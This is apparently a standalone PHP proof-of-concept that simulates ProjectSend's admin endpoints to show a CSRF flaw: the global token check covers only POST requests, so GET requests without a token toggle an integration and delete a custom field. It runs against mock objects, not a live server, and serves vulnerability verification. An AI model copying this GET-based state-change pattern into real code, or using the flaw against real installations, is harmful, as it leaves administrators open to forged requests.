<?php
/** Standalone PoC for ProjectSend GET-based CSRF in privileged management endpoints. */
ini_set('display_errors', '1');
error_reporting(E_ALL);
class Forbidden extends Exception {}
function exit_with_error_code(int $code): void { throw new Forbidden("HTTP $code"); }
function validateCsrfToken(): bool { return isset($_SESSION['csrf_token'], $_REQUEST['csrf_token']) && hash_equals($_SESSION['csrf_token'], $_REQUEST['csrf_token']); }
function projectSendGlobalCsrfGate(): void {
    if (!defined('IS_INSTALL') && $_POST && !validateCsrfToken()) exit_with_error_code(403);
}
function redirect_if_not_logged_in(): void { if (empty($_SESSION['user_id'])) exit_with_error_code(403); }
function current_user_can(string $permission): bool { return in_array($permission, $_SESSION['permissions'] ?? [], true); }
function current_role_in(array $roles): bool { return in_array($_SESSION['role'] ?? '', $roles, true); }
class Integrations {
    public array $rows = [7 => ['id' => 7, 'name' => 'S3 backup', 'active' => 1]];
    public function getById(int $id): ?array { return $this->rows[$id] ?? null; }
    public function delete(int $id): array { unset($this->rows[$id]); return ['status' => 'success', 'message' => 'deleted']; }
    public function update(int $id, array $data): array { $this->rows[$id] = array_merge($this->rows[$id], $data); return ['status' => 'success', 'message' => 'updated']; }
}
class CustomField {
    public static array $rows = [3 => ['id' => 3, 'name' => 'Internal Cost Center', 'active' => 1]];
    public int $active = 0; private int $id;
    public function __construct(int $id) { $this->id = $id; $this->active = self::$rows[$id]['active'] ?? 0; }
    public function fieldExists(): bool { return isset(self::$rows[$this->id]); }
    public function delete(): array { unset(self::$rows[$this->id]); return ['status' => 'success', 'message' => 'deleted']; }
    public function set(array $data): void { foreach ($data as $k => $v) { self::$rows[$this->id][$k] = $v; $this->$k = $v; } }
    public function update(): array { return ['status' => 'success', 'message' => 'updated']; }
}
function integrationsPageLogic(array $get, Integrations $integrations): void {
    $_GET = $get; $_REQUEST = $_GET + $_POST;
    projectSendGlobalCsrfGate(); redirect_if_not_logged_in();
    if (!current_user_can('edit_settings')) exit_with_error_code(403);
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && !empty($_GET['id'])) { $integrations->delete((int)$_GET['id']); return; }
    if (isset($_GET['action']) && $_GET['action'] === 'toggle' && !empty($_GET['id'])) {
        $integration_id = (int)$_GET['id']; $integration = $integrations->getById($integration_id);
        if ($integration) { $new_status = $integration['active'] ? 0 : 1; $integrations->update($integration_id, ['active' => $new_status]); }
    }
}
function customFieldsPageLogic(array $get): void {
    $_GET = $get; $_REQUEST = $_GET + $_POST;
    projectSendGlobalCsrfGate(); redirect_if_not_logged_in();
    if (!current_role_in(['System Administrator']) && !current_user_can('manage_custom_fields')) exit_with_error_code(403);
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && !empty($_GET['id'])) {
        $field = new CustomField((int)$_GET['id']); if ($field->fieldExists()) $field->delete(); return;
    }
    if (isset($_GET['action']) && $_GET['action'] === 'toggle' && !empty($_GET['id'])) {
        $field = new CustomField((int)$_GET['id']); if ($field->fieldExists()) { $new_status = $field->active ? 0 : 1; $field->set(['active' => $new_status]); $field->update(); }
    }
}
$_SESSION = ['user_id' => 1, 'role' => 'System Administrator', 'permissions' => ['edit_settings', 'manage_custom_fields']];
$_POST = [];
$integrations = new Integrations();
$beforeIntegration = $integrations->rows[7]['active'];
$beforeFieldExists = isset(CustomField::$rows[3]);
integrationsPageLogic(['action' => 'toggle', 'id' => '7'], $integrations);
customFieldsPageLogic(['action' => 'delete', 'id' => '3']);
$afterIntegration = $integrations->rows[7]['active'];
$afterFieldExists = isset(CustomField::$rows[3]);
printf("[*] Global CSRF gate checks only POST; current request method modeled as GET.\n");
printf("[*] csrf_token supplied: %s.\n", isset($_REQUEST['csrf_token']) ? 'yes' : 'no');
printf("[*] integration[7].active before=%d after=%d.\n", $beforeIntegration, $afterIntegration);
printf("[*] custom_field[3] existed before=%s after=%s.\n", $beforeFieldExists ? 'yes' : 'no', $afterFieldExists ? 'yes' : 'no');
if ($beforeIntegration !== $afterIntegration && $beforeFieldExists && !$afterFieldExists) {
    echo "[VULNERABLE] GET requests without a csrf_token changed ProjectSend admin state.\n"; exit(0);
}
echo "[NOT VULNERABLE] GET requests did not change state.\n"; exit(1);
